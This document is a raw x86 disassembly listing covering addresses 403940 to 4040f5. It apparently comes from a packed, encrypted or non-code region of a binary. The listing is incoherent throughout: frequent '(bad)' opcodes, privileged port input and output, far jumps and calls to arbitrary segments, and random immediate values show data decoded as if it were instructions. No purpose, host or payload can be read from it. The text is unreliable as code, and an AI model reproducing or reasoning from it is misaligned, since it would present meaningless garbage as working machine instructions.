  403940:	shr    dh,1
  403942:	clc    
  403943:	out    0x24,al
  403945:	adc    DWORD PTR [esi-0x48217eb5],edi
  40394b:	xchg   esi,eax
  40394c:	xor    al,BYTE PTR [ebx]
  40394e:	repz in al,0x95
  403951:	(bad)  
  403952:	jns    0x403965
  403954:	out    0x16,al
  403956:	add    ecx,DWORD PTR [edi-0x21]
  403959:	shl    DWORD PTR [eax],1
  40395b:	and    edi,DWORD PTR [edi-0x3]
  40395e:	lahf   
  40395f:	jge    0x403936
  403961:	mov    bh,0x2b
  403963:	xor    cl,BYTE PTR [ebx+0x2c]
  403966:	jmp    0x40392a
  403968:	mov    al,BYTE PTR [edi+0x3f1d71f3]
  40396e:	sub    cl,BYTE PTR ds:0x70c17026
  403974:	and    al,0xcf
  403976:	out    dx,al
  403977:	mov    esp,0xbd53e9d0
  40397c:	xor    DWORD PTR [ebx-0xa],ecx
  40397f:	aam    0x3b
  403981:	test   al,0xc2
  403983:	dec    ecx
  403984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403985:	repnz (bad) 
  403987:	fsub   st(4),st
  403989:	mov    al,0xb5
  40398b:	int3   
  40398c:	sahf   
  40398d:	xor    ah,BYTE PTR ds:0x324fc13b
  403993:	mov    ebp,0xc229a195
  403998:	push   ss
  403999:	loopne 0x4039b9
  40399b:	sub    ebp,DWORD PTR [edx]
  40399d:	cdq    
  40399e:	mov    ecx,0xd6b5031c
  4039a3:	jmp    0xb6381a8e
  4039a8:	call   0x5aae:0xa40e192a
  4039af:	mov    ch,BYTE PTR [esi+0x60e5655d]
  4039b5:	sar    ah,1
  4039b7:	add    esi,DWORD PTR [edx-0x6b]
  4039ba:	lods   al,BYTE PTR ds:[esi]
  4039bb:	xchg   edx,eax
  4039bc:	sahf   
  4039bd:	jne    0x403982
  4039bf:	xchg   esp,eax
  4039c0:	iret   
  4039c1:	pop    edi
  4039c2:	jns    0x403a39
  4039c4:	retf   
  4039c5:	push   ecx
  4039c6:	(bad)
  4039ca:	scas   eax,DWORD PTR es:[edi]
  4039cb:	lds    ebp,FWORD PTR [ebx]
  4039cd:	repz out dx,al
  4039cf:	and    ebx,0x1703acef
  4039d5:	cwde   
  4039d6:	inc    eax
  4039d7:	jo     0x403a02
  4039d9:	push   esp
  4039da:	mov    ebp,0x1d8f5c1f
  4039df:	cmp    al,0xa5
  4039e1:	ss add bl,dl
  4039e4:	push   cs
  4039e5:	xlat   BYTE PTR ds:[ebx]
  4039e6:	push   edx
  4039e7:	popf   
  4039e8:	dec    esp
  4039e9:	mov    edx,0x50fc549d
  4039ee:	push   ebp
  4039ef:	xchg   ebp,eax
  4039f0:	rol    BYTE PTR [edi+esi*8],0x34
  4039f4:	jae    0x403a75
  4039f6:	imul   ebp,esi,0xffffff93
  4039f9:	hlt    
  4039fa:	dec    edx
  4039fb:	into   
  4039fc:	(bad)  
  4039fd:	xor    edx,ecx
  4039ff:	mov    DWORD PTR [esi+edi*4+0x6c],esp
  403a03:	arpl   WORD PTR [ebx-0x4b9331e1],dx
  403a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a0a:	push   ecx
  403a0b:	repnz (bad) 
  403a0d:	call   FWORD PTR [edi+0x2da88a41]
  403a13:	fild   DWORD PTR es:[esi+0x59ca49f5]
  403a1a:	shr    DWORD PTR [ebx],0xc6
  403a1d:	xor    BYTE PTR [ecx],dl
  403a1f:	mov    cl,0x6e
  403a21:	push   es
  403a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a23:	jp     0x403a51
  403a25:	cmc    
  403a26:	div    DWORD PTR [eax-0x36e47fa]
  403a2c:	jmp    FWORD PTR [esi-0x6b]
  403a2f:	out    0x2e,al
  403a31:	(bad)  
  403a32:	sbb    ebp,esp
  403a34:	add    bh,BYTE PTR [edx+0x32]
  403a37:	mov    ch,dl
  403a39:	sbb    cl,al
  403a3b:	pop    es
  403a3c:	icebp  
  403a3d:	(bad)  
  403a3e:	cmp    BYTE PTR [edi],bl
  403a40:	sub    BYTE PTR ds:0x2c5345bf,al
  403a46:	jmp    DWORD PTR [ebx]
  403a48:	jp     0x4039f0
  403a4a:	push   esp
  403a4b:	mov    eax,0x437f7261
  403a50:	jb     0x403a4c
  403a52:	test   DWORD PTR [ecx],eax
  403a54:	pop    edi
  403a55:	dec    esi
  403a56:	jle    0x403a85
  403a58:	push   cs
  403a59:	mov    ebp,0xdd63264c
  403a5e:	push   0x47c0e47
  403a63:	stc    
  403a64:	clc    
  403a65:	pop    es
  403a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a67:	and    DWORD PTR [esi+0x3e],eax
  403a6a:	jmp    0x19491841
  403a6f:	les    esp,FWORD PTR [edi+0x35]
  403a72:	icebp  
  403a73:	jmp    0x24434b4a
  403a78:	or     eax,0x8559dcce
  403a7d:	jge    0x403a01
  403a7f:	pop    ds
  403a80:	dec    ecx
  403a81:	or     ebx,DWORD PTR [edx-0x33d2e7e7]
  403a87:	(bad)
  403a8a:	sub    DWORD PTR [edi+0x7432aa37],0x19410208
  403a94:	imul   ebp,DWORD PTR [ebx+0x59c15bae],0x281982f3
  403a9e:	xchg   edi,eax
  403a9f:	pusha  
  403aa0:	mov    edx,0x8cc670ae
  403aa5:	pusha  
  403aa6:	push   es
  403aa7:	push   ss
  403aa8:	call   0xf8c63a9b
  403aad:	jle    0x403afe
  403aaf:	xor    ch,BYTE PTR ds:0x4a28518
  403ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab6:	(bad)  
  403ab7:	imul   esp,DWORD PTR es:[edi],0xbc335bf5
  403abe:	inc    eax
  403abf:	mov    edi,0x9d6e7915
  403ac4:	add    eax,0xadb04268
  403ac9:	adc    ch,dh
  403acb:	push   es
  403acc:	sbb    ecx,DWORD PTR [ecx+edx*8+0x3c]
  403ad0:	or     al,0x35
  403ad2:	xor    eax,0x720bb899
  403ad7:	or     ah,BYTE PTR [ecx]
  403ad9:	mov    ch,0xde
  403adb:	or     DWORD PTR [eax+0x2d],0xc16e5b4e
  403ae2:	push   ebp
  403ae3:	and    ebp,DWORD PTR [ecx]
  403ae5:	adc    al,0x3a
  403ae7:	outs   dx,BYTE PTR ds:[esi]
  403ae8:	data16 aas 
  403aea:	jnp    0x403a9f
  403aec:	sahf   
  403aed:	loop   0x403b4d
  403aef:	add    eax,0x4545a665
  403af5:	outs   dx,BYTE PTR ds:[esi]
  403af6:	push   ecx
  403af7:	sub    eax,0x48e712c8
  403afc:	loope  0x403a9a
  403afe:	xor    BYTE PTR [edi-0x32],ah
  403b01:	or     eax,0x1f0a9a63
  403b06:	jmp    0x28e5:0xca0dd03b
  403b0d:	enter  0x8305,0x1
  403b11:	call   FWORD PTR [ebx]
  403b13:	jecxz  0x403b66
  403b15:	iret   
  403b16:	popa   
  403b17:	loopne 0x403b4f
  403b19:	push   edx
  403b1a:	cs pop esi
  403b1c:	mov    al,ds:0x74153ab2
  403b21:	ds push ecx
  403b23:	inc    bl
  403b25:	fcomp  st(3)
  403b27:	aaa    
  403b28:	daa    
  403b29:	fsubr  QWORD PTR [eax-0x7c]
  403b2c:	dec    edi
  403b2d:	fdiv   DWORD PTR [ebx]
  403b2f:	mov    al,0x40
  403b31:	cmp    bl,cl
  403b33:	pushf  
  403b34:	retf   0x3889
  403b37:	jns    0x403b9d
  403b39:	push   esp
  403b3a:	je     0x403b37
  403b3c:	idiv   BYTE PTR [esi-0x6aee946e]
  403b42:	xchg   edx,eax
  403b43:	adc    BYTE PTR ds:0xb1a5cd4b,al
  403b49:	and    edi,esp
  403b4b:	dec    edx
  403b4c:	cld    
  403b4d:	fwait
  403b4e:	daa    
  403b4f:	loop   0x403b87
  403b51:	mov    ss,WORD PTR [edx]
  403b53:	lods   al,BYTE PTR ds:[esi]
  403b54:	jae    0x403b19
  403b56:	mov    eax,0x650510d5
  403b5b:	or     DWORD PTR [edx-0x12dcc097],edi
  403b61:	mov    esp,0x9eb2c3b6
  403b66:	jle    0x403b20
  403b68:	or     ebp,DWORD PTR [ebp+0x12]
  403b6b:	stos   DWORD PTR es:[edi],eax
  403b6c:	push   edi
  403b6d:	call   FWORD PTR [edi]
  403b6f:	add    dh,bl
  403b71:	adc    eax,0x5fbee882
  403b76:	test   BYTE PTR [edx+0x55e8c7f1],dh
  403b7c:	fild   DWORD PTR [ecx]
  403b7e:	(bad)  
  403b7f:	xlat   BYTE PTR ds:[ebx]
  403b80:	int    0xf4
  403b82:	jmp    0x403b1e
  403b84:	jp     0x403bae
  403b86:	int    0xb2
  403b88:	cmc    
  403b89:	jmp    0xf9ea4d20
  403b8e:	pushf  
  403b8f:	cwde   
  403b90:	adc    eax,0x46ef2fa2
  403b95:	mov    cl,0xc
  403b97:	sti    
  403b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b99:	repz jp 0x403c0f
  403b9c:	push   ss
  403b9d:	dec    edi
  403b9e:	retf   0x2a41
  403ba1:	or     eax,0xee4db45f
  403ba6:	fcmovu st,st(7)
  403ba8:	xchg   DWORD PTR [edx],ecx
  403baa:	sbb    ebx,DWORD PTR [eax+0x4fedc91e]
  403bb0:	loop   0x403c0d
  403bb2:	adc    BYTE PTR [ebx+0x440661e3],ah
  403bb8:	inc    esi
  403bb9:	or     al,0x1c
  403bbb:	jns    0x403b8a
  403bbd:	xchg   BYTE PTR [edx+0x22],bl
  403bc0:	in     eax,dx
  403bc1:	call   0xae57:0x2e57d9d5
  403bc8:	fs or  al,0x67
  403bcb:	test   DWORD PTR [ebx-0xd],eax
  403bce:	mov    dh,0x47
  403bd0:	mov    es:0x270f969b,al
  403bd6:	xchg   bh,cl
  403bd8:	adc    ah,BYTE PTR [eax+esi*2]
  403bdb:	ins    BYTE PTR es:[edi],dx
  403bdc:	adc    BYTE PTR [eax+0x3d],ah
  403bdf:	xlat   BYTE PTR ds:[ebx]
  403be0:	pop    edx
  403be1:	sbb    BYTE PTR [edx-0x39],dl
  403be4:	mov    ds:0x33452e03,al
  403be9:	xchg   edi,eax
  403beb:	xchg   edx,eax
  403bec:	jp     0x403ba9
  403bee:	sbb    edx,esi
  403bf0:	mov    edi,0xf06078ef
  403bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf6:	pcmpeqd mm6,QWORD PTR [edx]
  403bf9:	or     ebp,ebp
  403bfb:	aad    0xb6
  403bfd:	repz daa 
  403bff:	sub    bh,BYTE PTR [edx-0x2d4aed2d]
  403c05:	adc    eax,0x6bcc65dd
  403c0a:	imul   ebp,eax,0xd5fc471f
  403c10:	test   eax,0xa3474748
  403c15:	sub    al,0x70
  403c17:	nop    DWORD PTR ds:0xdebf92f1
  403c1e:	fisttp QWORD PTR es:[ecx+0x2b7d050f]
  403c25:	retf   
  403c26:	push   esp
  403c27:	jp     0x403bee
  403c29:	stc    
  403c2a:	xchg   ebx,eax
  403c2b:	test   al,0xd7
  403c2d:	in     al,0x3a
  403c2f:	push   eax
  403c30:	mov    ds:0x8594dfd8,al
  403c35:	jne    0x403bde
  403c37:	mov    eax,ds:0x3b318caa
  403c3c:	push   ecx
  403c3d:	scas   eax,DWORD PTR es:[edi]
  403c3e:	mov    edx,ebp
  403c40:	mov    ebx,0x2c765f0c
  403c45:	pop    eax
  403c46:	fwait
  403c47:	dec    esp
  403c48:	lds    edi,FWORD PTR [edx-0x2b930283]
  403c4e:	pop    ebx
  403c4f:	outs   dx,DWORD PTR ds:[esi]
  403c50:	sub    eax,0xcaae7fb
  403c55:	jp     0x403cc4
  403c57:	jp     0x403bda
  403c59:	mov    bh,0x86
  403c5b:	dec    ebx
  403c5c:	xor    BYTE PTR [esi-0x55d24eae],bh
  403c62:	ss in  eax,0x4d
  403c65:	in     al,dx
  403c66:	sahf   
  403c67:	mov    al,ds:0x24306a92
  403c6c:	pop    ebp
  403c6d:	and    eax,0xd2fa24e
  403c72:	gs inc esi
  403c74:	cmp    BYTE PTR [edi],dl
  403c76:	jnp    0x403c02
  403c78:	hlt    
  403c79:	mov    dh,0x88
  403c7b:	test   eax,0x9c6239b
  403c80:	dec    esp
  403c81:	cdq    
  403c82:	jmp    0x403cec
  403c84:	ret    0x4d46
  403c87:	jmp    0x8bf8:0x2131d5f
  403c8e:	aam    0xb7
  403c90:	ins    DWORD PTR es:[edi],dx
  403c91:	retf   
  403c92:	popf   
  403c93:	les    ecx,FWORD PTR [ecx+eax*1]
  403c96:	adc    eax,0xc5b92648
  403c9b:	cmp    al,0x3c
  403c9d:	push   ebp
  403c9e:	out    dx,al
  403c9f:	stos   DWORD PTR es:[edi],eax
  403ca0:	dec    edi
  403ca1:	scas   eax,DWORD PTR es:[edi]
  403ca2:	push   eax
  403ca3:	ret    0x4509
  403ca6:	xor    eax,ebx
  403ca8:	test   bl,ah
  403caa:	jno    0x403d11
  403cac:	(bad)
  403caf:	fs dec esp
  403cb1:	mov    dh,bl
  403cb3:	pop    edx
  403cb4:	stos   DWORD PTR es:[edi],eax
  403cb5:	gs push 0xf47956f9
  403cbb:	fstp   DWORD PTR [ebx+0x77]
  403cbe:	xor    BYTE PTR [esi+edx*1+0x4ac167e0],cl
  403cc5:	add    eax,0x197ba
  403cca:	cmp    eax,DWORD PTR [ecx-0x62239d7]
  403cd0:	ins    BYTE PTR es:[edi],dx
  403cd1:	pop    ss
  403cd2:	out    0x99,al
  403cd4:	sbb    al,0x7a
  403cd6:	fnstenv [ecx-0x21]
  403cd9:	xchg   ebp,eax
  403cda:	sub    dl,cl
  403cdc:	das    
  403cdd:	je     0x403cde
  403cdf:	mov    ebx,DWORD PTR [edi+0x2d6c8b20]
  403ce5:	popf   
  403ce6:	mov    eax,ds:0x452bbb6d
  403ceb:	cmp    eax,0xc726b3cf
  403cf0:	push   edx
  403cf1:	loopne 0x403cb4
  403cf3:	jns    0x403d6c
  403cf5:	aaa    
  403cf6:	xor    DWORD PTR [eax],ebp
  403cf8:	(bad)  
  403cf9:	retf   0x770
  403cfc:	sahf   
  403cfd:	mov    DWORD PTR [ebp+0x63bc213c],0x4f9910a0
  403d07:	xchg   edx,eax
  403d08:	into   
  403d09:	ins    BYTE PTR es:[edi],dx
  403d0a:	(bad)  
  403d0b:	je     0x403d01
  403d0d:	stos   BYTE PTR es:[edi],al
  403d0e:	adc    BYTE PTR [ecx+0x6da49991],0xb9
  403d15:	and    DWORD PTR [edx+0x2e],edi
  403d18:	repz test BYTE PTR [edx+0x1d],0x72
  403d1d:	jmp    0x403cab
  403d1f:	test   al,0x4
  403d21:	mov    fs,esi
  403d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d24:	lods   eax,DWORD PTR ds:[esi]
  403d25:	sbb    cl,dh
  403d27:	les    eax,FWORD PTR [eax+0x3e01185c]
  403d2d:	jmp    0x403cce
  403d2f:	lods   al,BYTE PTR ds:[esi]
  403d30:	jmp    0x9800:0xc72d6703
  403d37:	add    ah,BYTE PTR [esi]
  403d39:	cmovae ebx,DWORD PTR [ebx]
  403d3c:	scas   al,BYTE PTR es:[edi]
  403d3d:	call   0xaad0:0x7fdfdb04
  403d44:	adc    BYTE PTR [eax],al
  403d46:	push   0x32
  403d48:	fcmovnb st,st(5)
  403d4a:	dec    esp
  403d4b:	in     eax,0xdd
  403d4d:	push   esi
  403d4f:	aaa    
  403d50:	jo     0x403ce5
  403d52:	push   cs
  403d53:	xchg   edx,eax
  403d54:	mov    BYTE PTR [ebp+eiz*4+0x25],cl
  403d58:	ror    BYTE PTR [edi-0x75a3b23b],0xf2
  403d5f:	mov    ebx,0x3741f29a
  403d64:	gs rcl cl,cl
  403d67:	in     eax,0x4e
  403d69:	pop    ebp
  403d6a:	outs   dx,DWORD PTR ds:[esi]
  403d6b:	inc    esi
  403d6c:	daa    
  403d6d:	push   edi
  403d6e:	xchg   esi,eax
  403d6f:	shl    esp,0x3b
  403d72:	fldenv [edi-0x2f44f47]
  403d78:	jbe    0x403d8d
  403d7a:	daa    
  403d7b:	daa    
  403d7c:	mov    DWORD PTR [eax],edx
  403d7e:	jmp    0x403d75
  403d80:	jo     0x403d52
  403d82:	push   edi
  403d83:	cmp    ah,cl
  403d85:	cwde   
  403d86:	pusha  
  403d87:	adc    eax,0xa00c5d20
  403d8c:	test   BYTE PTR [ebx],bh
  403d8e:	jo     0x403d4b
  403d90:	xchg   cl,ah
  403d92:	mov    WORD PTR [edi-0x32],?
  403d95:	add    dl,bh
  403d97:	int    0x1
  403d99:	out    0x23,eax
  403d9b:	ret    
  403d9c:	xor    eax,0x73197c4a
  403da1:	cmovle ebp,DWORD PTR [ecx]
  403da4:	loope  0x403e24
  403da6:	inc    ebx
  403da7:	cmp    edi,DWORD PTR [ebx+ebx*1]
  403daa:	push   ebx
  403dab:	stc    
  403dac:	in     eax,0xfa
  403dae:	sub    esi,DWORD PTR [edx-0x6d]
  403db1:	and    al,al
  403db3:	mov    ch,0xf8
  403db5:	icebp  
  403db6:	and    BYTE PTR [ebp+0x4],al
  403db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dba:	gs retf 
  403dbc:	daa    
  403dbd:	inc    esi
  403dbe:	bound  ecx,QWORD PTR [ecx-0x646d9ff9]
  403dc4:	popf   
  403dc5:	jge    0x403dce
  403dc7:	test   al,0xb5
  403dc9:	icebp  
  403dca:	stc    
  403dcb:	mov    ds:0x25ec678d,al
  403dd0:	mov    edi,DWORD PTR [edx+0x6ad4160a]
  403dd6:	loop   0x403e46
  403dd8:	out    0xdc,al
  403dda:	cmp    DWORD PTR [ebx+0x749b6ac1],edx
  403de0:	jno    0x403e4e
  403de2:	stos   DWORD PTR es:[edi],eax
  403de3:	cmp    DWORD PTR [edx],edi
  403de5:	mov    dh,0x45
  403de7:	sub    DWORD PTR [ebp+0x7d],edx
  403dea:	xchg   ebp,eax
  403deb:	aad    0x8e
  403ded:	mov    ebp,ss
  403def:	add    DWORD PTR [ebx],eax
  403df1:	adc    eax,0x4a2dfffb
  403df6:	sub    esp,DWORD PTR [edi]
  403df8:	add    ecx,DWORD PTR [eax+0x4b]
  403dfb:	in     al,dx
  403dfc:	mov    ecx,0x6bc45d5a
  403e01:	and    eax,0x2ca13ecd
  403e06:	lahf   
  403e07:	xchg   ebx,eax
  403e08:	xlat   BYTE PTR ds:[ebx]
  403e09:	ret    0x993
  403e0c:	fist   WORD PTR [edi-0x1e]
  403e0f:	popa   
  403e10:	push   esi
  403e11:	sahf   
  403e12:	fmulp  st(4),st
  403e14:	div    edi
  403e16:	mov    ecx,0xe63ffc8b
  403e1b:	adc    ecx,DWORD PTR [edx+0x586c6acc]
  403e21:	add    BYTE PTR [ecx+0x31d73c31],cl
  403e27:	punpckhdq mm0,mm1
  403e2a:	into   
  403e2b:	or     esp,DWORD PTR [ebp-0x5d5ad04]
  403e31:	cld    
  403e32:	sub    edi,ebx
  403e34:	inc    ecx
  403e35:	fsubr  st,st(7)
  403e37:	push   es
  403e38:	(bad)  
  403e39:	aad    0x88
  403e3b:	adc    al,0x29
  403e3d:	and    al,0x5c
  403e3f:	mov    ss,WORD PTR [eax-0x23]
  403e42:	pop    edi
  403e43:	sbb    DWORD PTR [ecx-0x64],ecx
  403e46:	push   ebp
  403e47:	imul   ebx,DWORD PTR [edx+0x2c],0xad26cec4
  403e4e:	es inc esi
  403e50:	add    DWORD PTR [ecx+0x4342b747],0xef581dce
  403e5a:	cli    
  403e5b:	push   cs
  403e5c:	jl     0x403e46
  403e5e:	ins    DWORD PTR es:[edi],dx
  403e5f:	xor    ebp,DWORD PTR [ecx-0x42]
  403e62:	fs add edx,ecx
  403e65:	mov    WORD PTR [edi-0x63],ds
  403e68:	dec    esp
  403e69:	pop    esi
  403e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e6b:	add    eax,ecx
  403e6d:	lea    esp,[ebp-0x163285be]
  403e73:	out    0x6,al
  403e75:	or     ah,BYTE PTR [edi-0x49]
  403e78:	das    
  403e79:	push   edx
  403e7a:	pushf  
  403e7b:	dec    edx
  403e7c:	mov    al,ds:0xf71964d6
  403e81:	shl    BYTE PTR [esi-0x373249a7],0x61
  403e88:	jg     0x403ed8
  403e8a:	pop    esp
  403e8b:	add    edi,DWORD PTR [esi]
  403e8d:	aas    
  403e8e:	xchg   ecx,eax
  403e8f:	ss cmc 
  403e91:	enter  0x23ff,0x5
  403e95:	or     dh,dl
  403e97:	int    0x47
  403e99:	fdiv   DWORD PTR [edx-0xcd9bf3]
  403e9f:	cmp    eax,0xdd416f
  403ea4:	pop    edi
  403ea5:	js     0x403f19
  403ea7:	push   ebx
  403ea8:	and    al,0xe6
  403eaa:	mov    ebp,0x1b1e53ab
  403eaf:	pop    ds
  403eb0:	int    0x82
  403eb2:	cmp    ebx,ecx
  403eb4:	inc    edx
  403eb5:	sub    edx,ebp
  403eb7:	or     ah,BYTE PTR ds:[eax]
  403eba:	ds mov bh,0x4e
  403ebd:	mov    edx,0xfe481f
  403ec3:	add    al,0x53
  403ec5:	neg    BYTE PTR [esi+0x6d4530c2]
  403ecb:	iret   
  403ecc:	fucomip st,st(4)
  403ece:	sbb    eax,0xb5359cc2
  403ed3:	inc    esi
  403ed4:	mov    edx,0x1eec97ec
  403ed9:	jecxz  0x403ea7
  403edb:	rcr    cl,0x81
  403ede:	fsubrp st(7),st
  403ee0:	and    edx,DWORD PTR [eax-0x12]
  403ee3:	out    0x7c,eax
  403ee5:	idiv   DWORD PTR [eax]
  403ee7:	xchg   edi,ebp
  403ee9:	mov    edi,0x5fc1d1c3
  403eee:	in     eax,dx
  403eef:	mov    cl,0xdd
  403ef1:	jns    0x403ee7
  403ef3:	aam    0x49
  403ef5:	xchg   edx,eax
  403ef6:	push   0xa534fa84
  403efb:	cmp    cl,BYTE PTR [edx]
  403efd:	or     DWORD PTR [eax-0x2cc4461b],0xffffff9b
  403f04:	popa   
  403f05:	cdq    
  403f06:	arpl   ax,sp
  403f08:	ins    DWORD PTR es:[edi],dx
  403f09:	mov    ah,0x61
  403f0b:	fisub  WORD PTR [edx-0x36]
  403f0e:	jp     0x403ef7
  403f10:	cmp    al,0xd
  403f12:	mov    esi,0x7290e262
  403f17:	sub    bh,cl
  403f19:	fs scas al,BYTE PTR es:[edi]
  403f1b:	lahf   
  403f1c:	mov    cl,0xa1
  403f1e:	pop    ds
  403f1f:	cs mov cl,0x13
  403f22:	push   esi
  403f23:	fisubr DWORD PTR [edx+0x3a345258]
  403f29:	push   ecx
  403f2a:	fst    DWORD PTR [eax+eax*8]
  403f2d:	or     DWORD PTR [edx],ebp
  403f2f:	mov    ds:0xf27b6ce1,al
  403f34:	sub    ch,BYTE PTR [edi-0x11275d7f]
  403f3a:	adc    al,0xa8
  403f3c:	ds sub al,0x42
  403f3f:	aaa    
  403f40:	pop    es
  403f41:	imul   eax,DWORD PTR [edx-0x4b224d9],0xffffffcd
  403f48:	add    eax,0x3c3fbbad
  403f4d:	add    DWORD PTR [edi-0x14],ebx
  403f50:	fist   WORD PTR [esi]
  403f52:	outs   dx,BYTE PTR ds:[esi]
  403f53:	xlat   BYTE PTR ds:[ebx]
  403f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f55:	xchg   DWORD PTR [ebp+0x7d88f0a5],esi
  403f5b:	push   0xebe3ed3d
  403f60:	dec    ecx
  403f61:	sahf   
  403f62:	push   ss
  403f63:	sub    BYTE PTR [edx+0x61],bl
  403f66:	fwait
  403f67:	push   cs
  403f68:	frndint 
  403f6a:	sub    ch,ah
  403f6c:	pusha  
  403f6d:	mov    ch,0x7a
  403f6f:	inc    ecx
  403f70:	or     eax,0x86a46dde
  403f75:	fld    st(5)
  403f77:	gs dec edi
  403f79:	and    BYTE PTR [ecx+0x67],cl
  403f7c:	(bad)  
  403f7d:	pop    esi
  403f7e:	in     eax,0xb3
  403f80:	outs   dx,DWORD PTR ds:[esi]
  403f81:	mov    ds:0x1a4413da,eax
  403f86:	dec    esi
  403f87:	gs into 
  403f89:	add    eax,0xf3923b02
  403f8e:	cmp    ecx,edx
  403f90:	fcom   QWORD PTR [ecx-0x5554a7f9]
  403f96:	dec    esp
  403f97:	pop    eax
  403f98:	jle    0x403f1c
  403f9a:	inc    edi
  403f9b:	cmp    al,0x8a
  403f9d:	sbb    al,0x6c
  403f9f:	xchg   ch,dl
  403fa1:	dec    edx
  403fa2:	ds inc ebp
  403fa4:	xchg   esp,eax
  403fa5:	loop   0x403fb6
  403fa7:	call   0x30e0a67d
  403fac:	pop    es
  403fad:	mov    eax,ds:0xa49f2de3
  403fb2:	jmp    0x11cd:0xe0489973
  403fb9:	out    dx,al
  403fba:	mul    BYTE PTR [esp+edx*1+0x6c]
  403fbe:	dec    edi
  403fbf:	inc    esp
  403fc0:	cmp    cl,BYTE PTR [ebx-0x69]
  403fc3:	add    al,0x61
  403fc5:	cmp    esi,DWORD PTR [ebx]
  403fc7:	mov    dl,0xfb
  403fc9:	test   DWORD PTR [eax+0x16aeda69],ebp
  403fcf:	hlt    
  403fd0:	dec    ecx
  403fd1:	je     0x403fdd
  403fd3:	rol    BYTE PTR [edi+eiz*1],cl
  403fd6:	mov    cl,0x1f
  403fd8:	add    bh,BYTE PTR [ebx-0x4b]
  403fdb:	add    eax,0x5f54b4cd
  403fe0:	ja     0x403f82
  403fe2:	sub    dl,BYTE PTR [edi-0x16]
  403fe5:	xchg   esi,eax
  403fe6:	sar    BYTE PTR [ecx+0x5f],1
  403fe9:	mov    BYTE PTR [ecx],al
  403feb:	fiadd  DWORD PTR [edi-0x65c99a88]
  403ff1:	lds    ebx,FWORD PTR [edx-0x51]
  403ff4:	lahf   
  403ff5:	inc    ebp
  403ff6:	xchg   esi,eax
  403ff7:	inc    edi
  403ff8:	ror    BYTE PTR [eax-0x4b],cl
  403ffb:	inc    ebx
  403ffc:	sar    BYTE PTR [esi],0x78
  403fff:	repnz push edi
  404001:	sar    BYTE PTR [edx+0x6411b512],cl
  404007:	stos   BYTE PTR es:[edi],al
  404008:	cmp    al,BYTE PTR gs:[edi-0x733060cb]
  40400f:	inc    ebp
  404010:	jnp    0x404022
  404012:	and    al,0xc4
  404014:	jbe    0x403fc7
  404016:	adc    DWORD PTR [edi+0x7],ebx
  404019:	(bad)  
  40401a:	add    DWORD PTR [eax],edx
  40401c:	jno    0x403fac
  40401e:	pusha  
  40401f:	mov    ch,BYTE PTR [esi-0x5a]
  404022:	pop    ebx
  404023:	jbe    0x403fed
  404025:	scas   eax,DWORD PTR es:[edi]
  404026:	fwait
  404027:	jo     0x404004
  404029:	retf   
  40402a:	add    al,cl
  40402c:	adc    bh,BYTE PTR [ebp-0x3e6ac38d]
  404032:	in     eax,dx
  404033:	jne    0x404044
  404035:	xor    esp,DWORD PTR cs:[ebx]
  404038:	adc    edx,0x2a
  40403b:	stos   BYTE PTR es:[edi],al
  40403c:	cli    
  40403d:	push   ss
  40403e:	in     eax,dx
  40403f:	adc    DWORD PTR [edx+0x5ffb90cd],edi
  404045:	adc    esi,DWORD PTR [esi+0x6ae1304d]
  40404b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404c:	sti    
  40404d:	add    BYTE PTR fs:[edx+ecx*2+0x1ffa161a],al
  404055:	ins    DWORD PTR es:[edi],dx
  404056:	aas    
  404057:	pusha  
  404058:	pop    es
  404059:	push   es
  40405a:	mov    al,ds:0x7cd159c1
  40405f:	sbb    esp,ebp
  404061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404062:	and    al,0xca
  404064:	loopne 0x4040be
  404066:	sar    DWORD PTR [esi],0xe6
  404069:	mov    esp,0xfe506e3d
  40406e:	add    al,0xc0
  404070:	xor    BYTE PTR [edi],bh
  404072:	aas    
  404073:	loopne 0x40408d
  404075:	cmp    DWORD PTR [edi-0xb1961ab],0x63f44875
  40407f:	lods   al,BYTE PTR ds:[esi]
  404080:	daa    
  404081:	xor    al,0x5f
  404083:	add    BYTE PTR [edx-0xbe652c0],0x9e
  40408a:	mov    al,0x50
  40408c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40408d:	push   0xbe1b0a20
  404092:	jle    0x404113
  404094:	mov    eax,0xf17f2ed7
  404099:	add    BYTE PTR [esi],0x96
  40409c:	lds    eax,FWORD PTR [ebx]
  40409e:	outs   dx,DWORD PTR ds:[esi]
  40409f:	iret   
  4040a0:	jmp    0x5847:0x9c523602
  4040a7:	fidivr DWORD PTR [ecx-0x539417dc]
  4040ad:	xchg   ebx,eax
  4040ae:	mov    esi,DWORD PTR [esi+0x64]
  4040b1:	es dec esp
  4040b3:	aaa    
  4040b4:	sbb    ebx,DWORD PTR [eax]
  4040b6:	lahf   
  4040b7:	sti    
  4040b8:	pop    ecx
  4040b9:	xor    bl,dh
  4040bb:	ret    0x6e69
  4040be:	stos   DWORD PTR es:[edi],eax
  4040bf:	lods   al,BYTE PTR ds:[esi]
  4040c0:	inc    edx
  4040c1:	cmp    cl,dh
  4040c3:	push   esi
  4040c4:	xchg   DWORD PTR [ecx-0x53],edi
  4040c7:	stos   DWORD PTR es:[edi],eax
  4040c8:	mov    edi,0x59bb3406
  4040cd:	jno    0x4040b9
  4040cf:	jae    0x4040c9
  4040d1:	mov    edi,0xfc0fb65c
  4040d6:	pop    ecx
  4040d7:	xchg   ebp,edx
  4040d9:	sub    DWORD PTR [edi+eiz*8],esp
  4040dc:	add    dh,BYTE PTR [eax-0x4942ec05]
  4040e2:	or     al,0xe4
  4040e4:	jg     0x4040b4
  4040e6:	std    
  4040e7:	add    edi,eax
  4040e9:	and    eax,0x316e497
  4040ef:	mov    eax,ds:0x982c612a
  4040f4:	stos   DWORD PTR es:[edi],eax
  4040f5:	add    al,0x18
